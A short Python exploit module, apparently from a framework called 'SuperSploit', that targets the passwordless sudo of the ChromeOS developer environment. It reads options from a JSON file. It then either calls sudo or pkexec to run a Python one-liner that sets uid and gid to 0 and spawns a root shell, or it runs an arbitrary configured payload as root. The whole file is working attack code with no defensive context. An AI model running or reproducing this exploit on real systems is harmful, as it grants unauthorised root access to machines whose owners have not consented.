import json
from subprocess import run
import os

# integrated = True

#!#!#!
# This exploit's the way chrome os developer environment
# does not require a passwd to run sudo. This is a Staged
# exploit/payload system test that will take advantage of
# chrome os no password sudo ability. If the exploit is
# staged, then this tries to run the PAYLOAD value as root
#
# REQUIRED OPTIONS
# SHELL: program or shell being used examples bash, python
# EXE: privilege controller pkexec, sudo etc
# STAGED: if staged runs the PAYLOAD value as root
#!#!#!

installation = f'{os.getenv("HOME")}/.SuperSploit'

def exploit():

    with open(f"{installation}/.data/data.json", 'r') as file:
        di = json.load(file)
        file.close()

    if "bool" not in str(type(di["STAGED"])):
        print("please specify if STAGED")
        return

    if di["SHELL"].split("/")[2] not in os.listdir("/bin/"):
        print("please use a installed shell")
        return

    if "none" in di["SHELL"] or "none" in di["EXE"]:
        print("Please set SHELL and EXE values")
        return

    if "None" in di["SHELL"] or "None" in di["EXE"]:
        print("Please set SHELL and EXE values")
        return

    if di["R_HOST"] is not None:
        import socket

    if not di["STAGED"]:
        run([f"{di['EXE']}", "python3", "-c", f"import os, pty; print('Setting uid and gid to 0'); os.setuid(0); os.setgid(0); print('Spawnning shell'); pty.spawn('{di['SHELL']}')"])
    else:
        run([f'{di["EXE"]}', f'{di["SHELL"]}', f'{di["PAYLOAD"]}'])

exploit()